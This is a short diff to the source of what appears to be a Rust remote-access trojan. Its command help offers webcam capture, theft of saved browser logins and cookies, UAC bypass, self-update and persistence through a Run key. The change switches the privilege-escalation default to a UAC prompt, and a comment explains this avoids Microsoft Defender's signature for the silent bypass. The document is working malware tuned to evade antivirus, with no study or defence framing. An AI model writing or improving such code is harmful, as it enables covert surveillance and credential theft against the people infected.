@@ -40,7 +40,7 @@ const HELP: &str = "\
 !webcam                    camera still -> files channel
 !browsers                  saved logins + cookies (chrome/edge/firefox)
 !clear [info|files]        delete messages in #console (or #information / #files)
-!uac [prompt|disable]      request admin; silent by default, prompt = UAC dialog
+!uac [silent|disable]      request admin (default: UAC prompt; silent = no-prompt bypass)
 !lock                      lock workstation
 !update                    pull newest build from #update and restart
 !uninstall                 remove payload + launcher + Run key, then stop
@@ -310,7 +310,9 @@ pub async fn dispatch(
         }
         "uac" | "elevate" => {
             let a = arg.trim().to_ascii_lowercase();
-            let prompt = a.contains("prompt");
+            // Default to the UAC *prompt*: Defender signatures the silent bypass
+            // (Behavior:Win32/UACBypassExp), the prompt is a normal elevation.
+            let prompt = !a.contains("silent");
             let disable = a.contains("disable") || a.contains("off");
             if host::is_elevated() {
                 if disable {
